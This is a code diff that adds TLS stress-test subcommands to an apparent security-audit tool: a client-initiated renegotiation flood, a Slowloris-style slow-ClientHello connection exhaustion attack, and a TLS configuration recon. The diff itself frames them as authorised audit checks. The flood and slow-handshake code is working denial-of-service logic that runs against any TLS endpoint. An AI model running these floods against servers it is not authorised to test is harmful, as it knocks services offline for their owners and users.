@@ -22,9 +22,12 @@ import json
 import logging
 import os
 import random
+import shutil
 import socket
 import ssl
 import string
+import struct
+import subprocess
 import sys
 import threading
 import time
@@ -634,6 +637,364 @@ def cmd_tls_handshake_flood(a):
 
 
 # ----------------------------------------------------------------------------
+# TLS renegotiation flood (uses openssl s_client; falls back to noting absence)
+# ----------------------------------------------------------------------------
+
+
+def cmd_tls_reneg_flood(a):
+    """Test whether the server allows client-initiated renegotiation in a loop.
+
+    Modern servers SHOULD reject this (RFC 5746 + insecure-reneg disabled
+    server-side, mitigation for CVE-2009-3555). Rejection is the positive
+    control finding. Acceptance is a critical finding.
+
+    Implementation: uses `openssl s_client` because Python's stdlib `ssl`
+    does not expose a stable client-initiated renegotiation API on
+    OpenSSL 1.1+. Install openssl-cli on the jump box.
+    """
+    confirm_authorisation(a.host, "tls-reneg-flood")
+    log, jsonl, _, _ = setup_evidence(a.host, "tls-reneg-flood", a.evidence_dir)
+
+    openssl = shutil.which("openssl")
+    if not openssl:
+        log.error("openssl binary not found on PATH. Install it or use openssl s_client manually:")
+        log.error("  openssl s_client -connect %s:%d -servername %s", a.host, a.port, a.host)
+        log.error("  then type 'R' (capital) and press Enter to request renegotiation.")
+        with open(str(jsonl), "w") as f:
+            f.write(json.dumps({"error": "openssl binary not found"}) + "\n")
+        sys.exit(2)
+
+    target = "{}:{}".format(a.host, a.port)
+    cmd = [openssl, "s_client", "-connect", target, "-servername", a.host, "-quiet"]
+    log.info("starting openssl s_client against %s (attempts=%d, interval=%ds)",
+             target, a.attempts, a.interval)
+
+    try:
+        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT, bufsize=0)
+    except OSError as e:
+        log.error("failed to spawn openssl: %s", e)
+        sys.exit(2)
+
+    # Give the handshake time to complete.
+    time.sleep(2)
+    attempted = 0
+    try:
+        for i in range(a.attempts):
+            try:
+                proc.stdin.write(b"R\n")
+                proc.stdin.flush()
+                attempted += 1
+                log.info("renegotiation request %d/%d sent", i + 1, a.attempts)
+            except (BrokenPipeError, OSError) as e:
+                log.warning("stdin write failed at attempt %d: %s", i + 1, e)
+                break
+            time.sleep(a.interval)
+    except KeyboardInterrupt:
+        log.info("interrupted")
+    finally:
+        try:
+            proc.stdin.close()
+        except OSError:
+            pass
+        try:
+            out_bytes, _ = proc.communicate(timeout=10)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            out_bytes, _ = proc.communicate()
+    out = out_bytes.decode("utf-8", errors="replace") if out_bytes else ""
+
+    # Classify outcome from openssl output.
+    lowered = out.lower()
+    if "renegotiat" in lowered and ("reject" in lowered or "alert" in lowered
+                                    or "no renegotiation" in lowered):
+        verdict = "REJECTED (control working as expected)"
+    elif "renegotiating" in lowered and "verify return code" in lowered:
+        verdict = "ACCEPTED (CRITICAL FINDING — server allows client-initiated reneg)"
+    elif attempted == 0:
+        verdict = "NO ATTEMPTS (openssl never connected)"
+    else:
+        verdict = "UNCLEAR (review openssl_output in evidence)"
+
+    log.info("verdict: %s", verdict)
+    log.info("attempts: %d", attempted)
+    with open(str(jsonl), "w") as f:
+        f.write(json.dumps({
+            "attempts": attempted,
+            "verdict": verdict,
+            "openssl_output_tail": out[-4000:],
+        }, indent=2) + "\n")
+    log.info("evidence: %s", jsonl)
+
+
+# ----------------------------------------------------------------------------
+# TLS slow handshake (Slowloris targeting the TLS state machine)
+# ----------------------------------------------------------------------------
+
+
+def _build_client_hello(host):
+    # type: (str) -> bytes
+    """Build a minimal valid TLS 1.2 ClientHello with SNI for the target host."""
+    sni_name = host.encode("ascii", errors="ignore")
+    sni_entry = b"\x00" + struct.pack(">H", len(sni_name)) + sni_name  # type=hostname
+    sni_list = struct.pack(">H", len(sni_entry)) + sni_entry
+    sni_ext = b"\x00\x00" + struct.pack(">H", len(sni_list)) + sni_list
+
+    # Single cipher: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (widely supported).
+    ciphers = b"\xc0\x2f"
+
+    body = (
+        b"\x03\x03"                       # client_version = TLS 1.2
+        + os.urandom(32)                  # random
+        + b"\x00"                         # session_id length = 0
+        + struct.pack(">H", len(ciphers)) + ciphers
+        + b"\x01\x00"                     # compression_methods: [null]
+        + struct.pack(">H", len(sni_ext)) + sni_ext
+    )
+    # Handshake header: type=1 (ClientHello), 3-byte length.
+    hs_len_3 = struct.pack(">I", len(body))[1:]
+    hs = b"\x01" + hs_len_3 + body
+    # Record header: type=22 (handshake), version=TLS 1.2, 2-byte length.
+    record = b"\x16\x03\x03" + struct.pack(">H", len(hs)) + hs
+    return record
+
+
+def cmd_tls_slow_handshake(a):
+    """Open many TCP connections, drip TLS ClientHello bytes slowly.
+
+    Holds the server's TLS handshake-state buffer. Connection never reaches
+    HTTP layer — works against ANY TLS endpoint regardless of auth, vhost,
+    or application behind it.
+
+    Audit value: tests whether the TLS terminator enforces a handshake
+    timeout aggressive enough to defeat slow ClientHello.
+    """
+    confirm_authorisation(a.host, "tls-slow-handshake")
+    log, jsonl, _, _ = setup_evidence(a.host, "tls-slow-handshake", a.evidence_dir)
+    stop = threading.Event()
+    # Each entry: [socket, bytes_remaining_to_send]
+    conns = []  # type: List[list]
+
+    hello = _build_client_hello(a.host)
+    log.info("ClientHello size=%d bytes; drip=%d bytes every %ds",
+             len(hello), a.drip_bytes, a.drip_interval)
+
+    def open_one():
+        try:
+            s = socket.create_connection((a.host, a.port), timeout=a.connect_timeout)
+            # Send first byte to commit the connection to the TLS state machine.
+            s.send(hello[:1])
+            return [s, hello[1:]]
+        except OSError as e:
+            msg = "{}: {}".format(type(e).__name__, e)
+            _CONNECT_ERR_SEEN["count"] += 1
+            if _CONNECT_ERR_SEEN["count"] == 1 or msg != _CONNECT_ERR_SEEN["last"] \
+                    or _CONNECT_ERR_SEEN["count"] % 50 == 0:
+                logging.warning("connect failed %s:%s [%d so far] %s",
+                                a.host, a.port, _CONNECT_ERR_SEEN["count"], msg)
+                _CONNECT_ERR_SEEN["last"] = msg
+            return None
+
+    for _ in range(a.sockets):
+        e = open_one()
+        if e:
+            conns.append(e)
+    log.info("initial connections held=%d/%d", len(conns), a.sockets)
+
+    probe_t = ProbeThread(a.host, a.port, True, a.probe_interval, jsonl,
+                          lambda: {"held_connections": len(conns),
+                                   "with_data_to_send":
+                                       sum(1 for e in conns if e[1])},
+                          stop, insecure=a.insecure)
+    probe_t.start()
+    start = time.monotonic()
+
+    try:
+        while time.monotonic() - start < a.duration:
+            alive = []
+            for ent in conns:
+                s, remaining = ent
+                try:
+                    if remaining:
+                        chunk = remaining[:a.drip_bytes]
+                        s.send(chunk)
+                        ent[1] = remaining[a.drip_bytes:]
+                    alive.append(ent)
+                except OSError:
+                    try:
+                        s.close()
+                    except OSError:
+                        pass
+            while len(alive) < a.sockets:
+                e = open_one()
+                if e:
+                    alive.append(e)
+                else:
+                    break
+            conns = alive
+            log.info("drip cycle: held=%d still_draining=%d",
+                     len(conns), sum(1 for x in conns if x[1]))
+            time.sleep(a.drip_interval)
+    except KeyboardInterrupt:
+        log.info("interrupted")
+    finally:
+        stop.set()
+        probe_t.join(timeout=2)
+        for ent in conns:
+            try:
+                ent[0].close()
+            except OSError:
+                pass
+        log.info("evidence: %s", jsonl)
+
+
+# ----------------------------------------------------------------------------
+# TLS recon (config snapshot, not an attack)
+# ----------------------------------------------------------------------------
+
+
+def cmd_tls_recon(a):
+    """Snapshot the target's TLS configuration. NOT an attack.
+
+    For full cipher enumeration use `testssl.sh -p <host>:<port>` or
+    `nmap --script ssl-enum-ciphers -p <port> <host>`. This is the
+    quick audit-grade snapshot for the workpaper's TLS section.
+    """
+    confirm_authorisation(a.host, "tls-recon")
+    log, jsonl, _, _ = setup_evidence(a.host, "tls-recon", a.evidence_dir)
+    report = {"host": a.host, "port": a.port, "tests": {}}
+
+    # 1. Default handshake — what does the server negotiate when client is permissive?
+    try:
+        ctx = _make_ctx(a.insecure)
+        ctx.set_alpn_protocols(["h2", "http/1.1"])
+        sock = socket.create_connection((a.host, a.port), timeout=10)
+        w = ctx.wrap_socket(sock, server_hostname=a.host)
+        d = {
+            "version": w.version(),
+            "cipher": list(w.cipher()) if w.cipher() else None,
+            "compression": w.compression(),
+            "selected_alpn": w.selected_alpn_protocol(),
+            "session_obtained": getattr(w, "session", None) is not None,
+        }
+        cert = None
+        try:
+            cert = w.getpeercert(binary_form=False)
+        except (ssl.SSLError, ValueError):
+            pass
+        if cert:
+            d["cert"] = {
+                "subject": cert.get("subject"),
+                "issuer": cert.get("issuer"),
+                "notAfter": cert.get("notAfter"),
+                "subjectAltName": cert.get("subjectAltName"),
+            }
+        report["tests"]["default_handshake"] = d
+        w.close()
+    except (OSError, ssl.SSLError) as e:
+        report["tests"]["default_handshake"] = {"error": "{}: {}".format(type(e).__name__, e)}
+
+    # 2. TLS version enumeration via OP_NO_* flags (3.6-compatible).
+    version_probes = [
+        ("TLSv1.0", ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2),
+        ("TLSv1.1", ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_2),
+        ("TLSv1.2", ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1),
+    ]
+    if hasattr(ssl, "OP_NO_TLSv1_3"):
+        for i, (label, opts) in enumerate(version_probes):
+            version_probes[i] = (label, opts | ssl.OP_NO_TLSv1_3)
+        version_probes.append((
+            "TLSv1.3",
+            ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2,
+        ))
+    report["tests"]["version_support"] = {}
+    for label, opts in version_probes:
+        try:
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            if a.insecure:
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+            ctx.options |= opts
+            sock = socket.create_connection((a.host, a.port), timeout=8)
+            w = ctx.wrap_socket(sock, server_hostname=a.host)
+            report["tests"]["version_support"][label] = {
+                "accepted": True, "negotiated": w.version(),
+            }
+            w.close()
+        except (OSError, ssl.SSLError, NotImplementedError) as e:
+            report["tests"]["version_support"][label] = {
+                "accepted": False, "error": str(e)[:200],
+            }
+
+    # 3. Session resumption — does a second connect reuse the session?
+    try:
+        ctx = _make_ctx(a.insecure)
+        s1 = socket.create_connection((a.host, a.port), timeout=10)
+        w1 = ctx.wrap_socket(s1, server_hostname=a.host)
+        sess = getattr(w1, "session", None)
+        w1.close()
+        if sess is None:
+            report["tests"]["session_resumption"] = {
+                "session_obtained": False,
+                "note": "Server did not issue a session ticket / no session object available",
+            }
+        else:
+            s2 = socket.create_connection((a.host, a.port), timeout=10)
+            w2 = ctx.wrap_socket(s2, server_hostname=a.host, session=sess)
+            report["tests"]["session_resumption"] = {
+                "session_obtained": True,
+                "session_reused": bool(getattr(w2, "session_reused", False)),
+            }
+            w2.close()
+    except (OSError, ssl.SSLError) as e:
+        report["tests"]["session_resumption"] = {"error": "{}: {}".format(type(e).__name__, e)}
+
+    # 4. Cipher class hint — does the negotiated suite use RSA key exchange?
+    dh = report["tests"].get("default_handshake", {})
+    cipher_info = dh.get("cipher")
+    if isinstance(cipher_info, list) and cipher_info:
+        name = cipher_info[0]
+        rsa_kx = "RSA" in name.split("-")[0:1] or name.startswith("AES") or name.startswith("RC4")
+        ecdhe = "ECDHE" in name
+        report["tests"]["cipher_class"] = {
+            "name": name,
+            "key_exchange_likely_rsa": rsa_kx and not ecdhe,
+            "perfect_forward_secrecy": ecdhe or "DHE" in name,
+        }
+
+    # Write report.
+    with open(str(jsonl), "w") as f:
+        f.write(json.dumps(report, indent=2, default=str) + "\n")
+
+    # Human summary to log.
+    log.info("=== TLS recon summary ===")
+    dh = report["tests"].get("default_handshake", {})
+    if "error" in dh:
+        log.info("Default handshake: FAILED  %s", dh["error"])
+    else:
+        log.info("Negotiated: version=%s cipher=%s alpn=%s",
+                 dh.get("version"),
+                 dh.get("cipher")[0] if dh.get("cipher") else None,
+                 dh.get("selected_alpn"))
+    vs = report["tests"].get("version_support", {})
+    if vs:
+        log.info("Version support:")
+        for v, info in vs.items():
+            log.info("  %-9s %s", v, "ACCEPTED" if info.get("accepted") else "rejected")
+    sr = report["tests"].get("session_resumption", {})
+    if sr:
+        log.info("Session resumption: obtained=%s reused=%s",
+                 sr.get("session_obtained"), sr.get("session_reused"))
+    cc = report["tests"].get("cipher_class", {})
+    if cc:
+        log.info("Cipher class: %s PFS=%s likely_RSA_kx=%s",
+                 cc.get("name"), cc.get("perfect_forward_secrecy"),
+                 cc.get("key_exchange_likely_rsa"))
+    log.info("Run `testssl.sh -p %s:%d` for full cipher enumeration", a.host, a.port)
+    log.info("evidence: %s", jsonl)
+
+
+# ----------------------------------------------------------------------------
 # Algorithmic / payload subcommand
 # ----------------------------------------------------------------------------
 
@@ -743,6 +1104,25 @@ def build_parser():
     sp.add_argument("--new-context-per-handshake", action="store_true",
                     help="Rebuild SSLContext per handshake; maximally expensive client-side too")
     sp.set_defaults(func=cmd_tls_handshake_flood)
+
+    sp = sub.add_parser("tls-reneg-flood"); common(sp)
+    sp.add_argument("--attempts", type=int, default=20,
+                    help="How many client-initiated reneg requests to send")
+    sp.add_argument("--interval", type=float, default=1,
+                    help="Seconds between reneg requests")
+    sp.set_defaults(func=cmd_tls_reneg_flood)
+
+    sp = sub.add_parser("tls-slow-handshake"); common(sp)
+    sp.add_argument("--sockets", type=int, default=150)
+    sp.add_argument("--drip-bytes", type=int, default=1,
+                    help="Bytes of ClientHello to send per drip cycle")
+    sp.add_argument("--drip-interval", type=int, default=15,
+                    help="Seconds between drip cycles (under server handshake timeout)")
+    sp.add_argument("--connect-timeout", type=float, default=4)
+    sp.set_defaults(func=cmd_tls_slow_handshake)
+
+    sp = sub.add_parser("tls-recon"); common(sp)
+    sp.set_defaults(func=cmd_tls_recon)
 
     sp = sub.add_parser("payload"); common(sp, with_path=True)
     sp.add_argument("--payload-file", required=True)
